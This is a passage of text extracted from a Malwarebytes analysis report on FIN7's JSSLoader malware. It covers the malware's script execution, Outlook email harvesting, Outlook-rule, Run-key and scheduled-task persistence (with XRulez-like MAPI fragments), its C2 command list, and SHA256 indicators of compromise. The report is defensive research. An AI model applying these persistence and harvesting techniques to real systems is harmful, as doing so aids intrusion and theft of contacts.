+47,"graduate" 
+48,"south" 
+49,"week" 
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+32 | P a g e  
+ 
+Example - a payload dropped under the name composed of the words from the dictionary: 
+
+ 
+
+Figure 29 - A dropped file, with randomly generated name 
+
+ 
+
+Running modules 
+Since the beginning, the malware was noticed for its ability to execute various scripts on the infected machine. 
+We can find the same functionality in the current sample. 
+
+Running a JS script: 
+
+ 
+
+Figure 30 
+
+  
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+33 | P a g e  
+ 
+Running VBSScript: 
+
+ 
+
+Figure 31 
+
+  
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+34 | P a g e  
+ 
+Running a custom PowerShell command: 
+
+ 
+
+Figure 32 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+35 | P a g e  
+ 
+Another command for running a PowerShell commands, this time from a file where they were saved - so-
+called Takeaway Script (this command is referenced as Cmd_RAT in the Morphisec's paper): 
+
+ 
+
+Figure 33 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+36 | P a g e  
+ 
+The current sample introduces a feature for running native modules directly from memory: 
+
+ 
+
+Figure 34 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+37 | P a g e  
+ 
+Operations on files 
+In addition to deploying a variety of payloads, the malware authors provided a feature for dropping data files 
+in arbitrary format: 
+
+ 
+
+Figure 35 
+
+They also added a feature for checking the file size at the supplied path - which may be useful i.e. in 
+verification if the payload was properly saved, or assessing which files could be exfiltrated. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+38 | P a g e  
+ 
+
+ 
+
+Figure 36 
+
+ 
+
+Interacting with MS Outlook 
+The current version of the JSSLoader uses Microsoft's MAPI (Mail Application Program Interface), that allows 
+to interact with MS Outlook. 
+
+First, the functions are dynamically loaded into a custom structure (illustrated at Figure 37). 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+39 | P a g e  
+ 
+
+ 
+
+Figure 37 – Loading MAPI functions into a custom IAT 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+40 | P a g e  
+ 
+Opening a MAPI session: 
+
+ 
+
+Figure 38 – fragment showing execution of function MAPILogonEx to open MAPI session 
+
+The authors implemented two operations that make use of the MAPI interface: 
+
+1. harvesting the emails saved in the address book 
+2. persistence using a malicious rule* 
+
+*Usage of the hidden Outlook rules by various malware families was described i.e. by Matthew Green, here, 
+and included in John Lambert's summary: Office 365 Attacks from 2019. 
+
+There are two C2 commands that support execution of those actions. One of them supports deploying both of 
+them sequentially; we can see the information logged during the operations (at Figure 39). 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+41 | P a g e  
+ 
+
+ 
+
+Figure 39 - The function that performs both actions related to MAPI interface 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+ 
+
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+42 | P a g e  
+ 
+The fragment of the code implementing harvesting of the emails is given below: 
+
+ 
+
+Figure 40 - Collecting all the e-mails recipients 
+
+For implementing persistence using a malicious rule, the authors of JSSLoader could have possibly got inspired 
+by the Open Source project XRulez (https://github.com/FSecureLABS/XRulez) - since we can find many 
+parallels between both of them, although the implementation differs.  
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+43 | P a g e  
+ 
+As the XRulez project's description says: "Outlook rules can be used to achieve persistence on Windows hosts 
+by creating a rule that executes a malicious payload. The rule can be setup to execute when the target receives 
+an email with a specific keyword in the subject. An attacker can then drop shells on a target as and when they 
+require by simply sending an email.". 
+
+Below some code snippets implementing this functionality within the analyzed malware. 
+
+Opening of the default message store: 
+
+ 
+
+Figure 41 
+
+Analogous to: MapiTools::MapiSession::OpenDefaultMessageStore from the XRulez project. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+44 | P a g e  
+ 
+Opening of the default receive folder: 
+
+ 
+
+Figure 42 
+
+Analogous to: MapiTools::MessageStore::OpenDefaultReceiveFolder from the XRulez project. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+45 | P a g e  
+ 
+Filling in the rule to be injected: 
+
+ 
+
+Figure 43 
+
+Analogous to: MapiTools::MapiFolder::InjectXrule. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+46 | P a g e  
+ 
+We can see multiple strings typical for this operation: 
+
+ 
+
+Figure 44 
+
+Analogous to the line: 
+
+ MapiTools::PropertyValueTString(PR_MESSAGE_CLASS,TEXT("IPM.Rule.Version2.Message")) 
+
+ 
+
+Figure 45 
+
+Analogous to the line: 
+
+ MapiTools::PropertyValueTString(PR_PARENT_DISPLAY, TEXT("Inbox")) 
+
+At the end of the creation, the rule is saved: 
+
+ 
+
+Figure 46 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+47 | P a g e  
+ 
+Analogous lines: 
+
+ CallWinApiHr(m_Pointer->CreateMessage(NULL, MAPI_ASSOCIATED, &message)); 
+ CallWinApiHr(message->SetProps(static_cast(std::size(lppPropArray)), lppPropArray, 
+
+nullptr)); 
+ CallWinApiHr(message->SaveChanges(KEEP_OPEN_READWRITE)); 
+
+ It can also enable execution of macros in Outlook by setting `EnableUnsafeClientMailRules` in the registry 
+(more info on this value here). 
+
+ 
+
+Figure 47 
+
+Analogous to:  
+
+ XRulez::Application::ExeDisableSecurityPatchKB3191883() 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+48 | P a g e  
+ 
+Updating, installing, uninstalling 
+The current version of JSSLoader can be installed on demand - it does not deploy the persistence by default. 
+The C2 can issue a command that fetches the current running filename, and command-line, and creates a Run 
+key for it, using the name `VideoCodecs` as a disguise: 
+
+ 
+
+Figure 48 
+
+Optional persistence makes sense taking into the consideration that this version of the JSSLoader is a 
+shellcode, and may be used as in-memory only. In the currently analyzed case it was running inside a 
+legitimate application, wermgr.exe. However, it is possible that in other models of deployment it will be 
+loaded directly from a wrapper executable, without injection to an external application - and then the 
+persistence may come in handy. 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+49 | P a g e  
+ 
+The C2 may also request termination and removal of the current module. That includes deletion of the key 
+used for the persistence, as well as of the executable file: 
+
+ 
+
+Figure 49 
+
+Since its early versions, the malware provided an auto-update mechanism. In the current edition it is 
+implemented with the help of a scheduled task, that is supposed to redeploy the new sample. After the 
+scheduled task is added, the currently running sample is uninstalled. 
+
+ 
+
+Figure 50 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+50 | P a g e  
+ 
+Running new payloads via scheduled task 
+Additionally, the authors added yet another, extended version of the function allowing to drop executables, 
+and run them with scheduled tasks. The second version - deployed via commands with IDs 18 and 19 - allows 
+also to customize more properties of the task, and to choose from two different triggers: one time only, or one 
+time + at logon.  
+
+Although the task description is the same as the previous one "Task CamVideo Update", this command does 
+not lead to deletion of the original sample. Its role is rather to run additional payloads. 
+
+ 
+
+Figure 51 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+51 | P a g e  
+ 
+
+The secondary payload: .NET 
+
+As mentioned earlier, during the observed campaign, the initial sample dropped a secondary payload, written 
+in .NET. Looking inside we find out that it is yet another version of JSSLoader - this one resembles the most 
+typical samples of this malware, that were earlier described by other vendors (i.e. here). 
+
+In the current executable, the names of functions and variables are obfuscated: 
+
+ 
+
+Figure 52 - Original version of the command-parsing function 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+52 | P a g e  
+ 
+However, after analyzing them, and renaming accordingly, we can see that the commands are identical to the 
+ones described earlier, i.e. in the Morphisec's report. 
+
+ 
+
+Figure 53 - Deobfuscated version of the command-parsing function 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+53 | P a g e  
+ 
+As we can see, the overlap in commands between the shellcode version, and the .NET version is significant, 
+although the shellcode version is enriched with new ones. The first 9 (from 2 to 10) commands, are identical in 
+both. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+54 | P a g e  
+ 
+The command with the ID 1, omitted in the C/C++ payloads, is present in a .NET version, and its role is to 
+display a simple, benign form: 
+
+ 
+
+Figure 54 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+55 | P a g e  
+ 
+The .NET payload sends a report about the system in a format that resembles the report send by the native 
+version: 
+
+ 
+
+Figure 55 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+ 
+
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+56 | P a g e  
+ 
+Strings may or may not contain some very mild obfuscation, such as breaking them into chunks: 
+
+ 
+
+Figure 56 
+
+As we can see this is the classic .NET variant of JSSLoader. The currently analyzed sample does not introduce 
+any new features. 
+
+The reason why the authors decided to chain together two payloads with almost exactly the same 
+functionality is unclear, but it may be a part of some tests. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+57 | P a g e  
+ 
+
+Comparison with older samples 
+
+In this part we will compare the shellcode version of the JSSLoader with the previously observed, analogous 
+samples from FIN7 campaigns. Our special focus will be to contrast it with earlier versions that share some 
+properties in common, such as: 
+
+ XLL format 
+ compiled to native code 
+ written in C/C++ 
+
+The XLL sample (March) 
+In March 2022, Morphisec reported about XLL payloads being used in FIN7 campaigns, to deliver the .NET 
+version of JSSLoader. 
+
+The xlAutoOpen function leads to a simple, not obfuscated function that implements the downloading 
+operation: 
+
+ 
+
+Figure 57 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+58 | P a g e  
+ 
+In contrast to the currently analyzed case, where the XLL file was an injector of the embedded JSSLoader in a 
+shellcode format, here the second stage must be downloaded. The provided functionality is very basic. The 
+payload is supposed to be in a PE format, run as a new process. The downloader does not try to obfuscate its 
+operations, and lacks fully-fledged botnet agent functionality. This type of downloaders was also observed in 
+the previous FIN7 campaigns, and dubbed FlyHigh. 
+
+The C++ version of JSSLoader 
+ 
+
+In July 2021, Proofpoint reported about the C++ rewrite of the JSSLoader (here). The sample 
+(7a17ef218eebfdd4d3e70add616adcd5b78105becd6616c88b79b261d1a78fdf ) was mentioned as one of the 
+first JSSLoader examples compiled to the native Intel code. 
+
+It comes in form of a 32 bit exe file, not packed by any packer/crypter. The PDB path from the developer 
+machine has been preserved: C:\Work\Downloader\Downloader\Release\Downloader.pdb. As we can see 
+the original executable is named `Downloader`. 
+
+ 
+
+Figure 58 
+
+Not only the sample isn't packed by any outer layer, but the code itself doesn't contain any obfuscation. We 
+can see all the strings as plaintext, including the familiar ones that make the JSON report. 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+59 | P a g e  
+ 
+
+ 
+
+Figure 59 – The fragment of the function responsible for composing the JSON report shows clear text strings 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+60 | P a g e  
+ 
+Following the referenced strings, we find that the malware implements its persistence with the help of a run 
+key, using a meaningful name: `AppJSSLoader` (in the new edition, this name has been replaced with 
+`VideoCodecs`): 
+
+ 
+
+Figure 60 – The run key created for the persistence points out the original malware name 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+61 | P a g e  
+ 
+We can also find there the same dictionary as in our shellcode version, yet it is initialized differently: 
+
+ 
+
+Figure 61 - Fragment of the code responsible for filling in the dictionary structure 
+
+The sample contains metadata, pointing to original names of the used classes. It makes understanding the 
+malware functionality much easier, as the developers gave a meaningful name to each class. 
+
+The implementation of the task selection is very different than in the shellcode edition. While in the shellcode 
+each task is a simple function, called in the switch-case, here they are represented as objects. Each task is an 
+object of a superclass inheriting from the `CTask` base class. They are created by `CTasksFactory`, based on the 
+given task ID. The older sample supports tasks numbered from 2 to 9 (while the current shellcode edition 
+supports tasks from 2 to 19). 
+ 
+
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+62 | P a g e  
+ 
+
+ 
+
+Figure 62 – The function parsing the tasks from the C++ version of JSSLoader 
+ 
+
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+63 | P a g e  
+ 
+Comparing with the latest sample (the shellcode edition): 
+
+2,CTaskRunJS 
+3,CTaskRunExe 
+4,CTaskUpdate 
+5,CTaskDelete 
+6,CTaskRunPS 
+7,CTaskRunSimplePS 
+8,CTaskRunVBS 
+9,CTaskRunDLL 
+10,send_system_fingerprint 
+11,run shellcode 
+12,add autorun key (pointing to the current application, with current commandline) 
+13,harvest emails; drop payload & add persistence via Outlook rule 
+14,harvest emails 
+15,save buffer into file 
+16,check given file size 
+17,harvest emails;  drop payload & add persistence via Outlook rule 
+18,drop a payload + add a scheduled task running it (one time only) 
+19,drop a payload + add a scheduled task running it (one time: x minutes from creation + at logon) 
+ 
+
+The old edition lacks i.e. the tasks related to fetching emails from Outlook. 
+
+Comparing the code, we see that in both the C++ version and the shellcode version use very different data-
+structures to implement the same functionality. It brings us to the conclusion that the shellcode version is a 
+distinct release, rewritten from scratch. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+64 | P a g e  
+ 
+
+Conclusion 
+
+Based on the latest XLL samples we collected, we can see that they are no longer used just as downloaders, 
+but instead they may carry a full version of JSSLoader inside. Speaking of which, this is yet another rewrite 
+different from the previously observed C++ version. 
+
+FIN7 appears to be shifting the development of this malware family into a direction where they are using new 
+native payloads, and improving obfuscation. The newly added commands show that JSSLoader is being 
+actively developed. 
+
+While JSSLoader still works mostly as a downloader and runner of other modules, its capabilities in this area 
+are being constantly enriched. In addition, we can also see some new functions that show some leaning 
+toward data exfiltration. Although its main power lies in running additional modules, it is possible that the 
+malware authors will try to make the main module a multipurpose botnet agent. 
+
+Malwarebytes detects these samples as FlyHigh. 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+65 | P a g e  
+ 
+
+IOCs 
+
+SHA256 Description 
+b08e713196b712c42da2df9da7836d270306065fbf6d4720f25d80e4104daf38 XLL sample 
+ 
+cc2171d14d0d3c4d117155185f7c911f781aac15b57adef6c32eb0149d5da3ba XLL sample 
+ 
+410cd107dfd37752936bd20d022ea614cd373aa9d37db255f65dc434e653236a XLL sample 
+ 
+bf1371e2d79115fc7cfc89266cd7a59c02b04a74e1246435392eb5e20c661d8f JSSLoader (shellcode) 
+ 
+35f5c781d61d398ce47a8881228346a81afb4915bf083518bf2b4cc8d6a2685b Second stage .NET payload 
+ 
+7a17ef218eebfdd4d3e70add616adcd5b78105becd6616c88b79b261d1a78fdf C++ version of JSSLoader (reported 
+
+ by ProofPoint) 
+7a234d1a2415834290a3a9c7274aadb7253dcfe24edb10b22f1a4a33fd027a08 XLL sample reported by Morphisec 
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes 
+
+
+
+66 | P a g e  
+ 
+ 
+
+ 
+JSSLoader: the shellcode edition - © Malwarebytes
